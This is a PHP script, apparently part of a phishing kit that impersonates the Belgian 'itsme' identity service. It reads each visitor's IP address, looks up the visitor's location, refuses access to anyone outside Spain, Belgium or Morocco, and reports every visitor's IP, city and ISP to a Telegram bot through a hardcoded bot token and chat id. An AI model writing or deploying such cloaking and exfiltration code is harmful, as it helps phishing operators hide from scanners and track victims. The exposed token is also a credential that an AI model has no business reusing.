﻿<?php  

function getIPAddress() {  
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];  
    } else {  
        $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
}  

$ip = getIPAddress();  

// GEO LOOKUP API
$geo_api = "http://ip-api.com/json/$ip";
$geo_data = json_decode(file_get_contents($geo_api), true);

// Get geo info
$country = $geo_data['country'] ?? "Unknown";
$countryCode = $geo_data['countryCode'] ?? "Unknown";
$region = $geo_data['regionName'] ?? "Unknown";
$city = $geo_data['city'] ?? "Unknown";
$isp = $geo_data['isp'] ?? "Unknown";
$timezone = $geo_data['timezone'] ?? "Unknown";


// ===== ALLOW ONLY ES / BE / LOCALHOST =====
function isLocalIP($ip) {
    return in_array($ip, ['127.0.0.1', '::1']);
}

$allowed = ['ES', 'BE', 'MA'];

if (!isLocalIP($ip) && !in_array($countryCode, $allowed)) {
    http_response_code(403);
    exit('Access denied.');
}
// ==========================================


$msg = "
-----◌⑅● IP ADDRESS ●⑅◌-----
NEW VISITOR ITSME BE
IP        : $ip
Country   : $country ($countryCode)
Region    : $region
City      : $city
ISP       : $isp
Timezone  : $timezone
-----◌⑅● ITSME ●⑅◌-----
";

$token = "8695463229:AAGPPe6dlxCtTcst5G2k3QqAR2CDZzHOfWY";
$data = [
    'text' => $msg,
    'chat_id' => '-5209400378'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

?>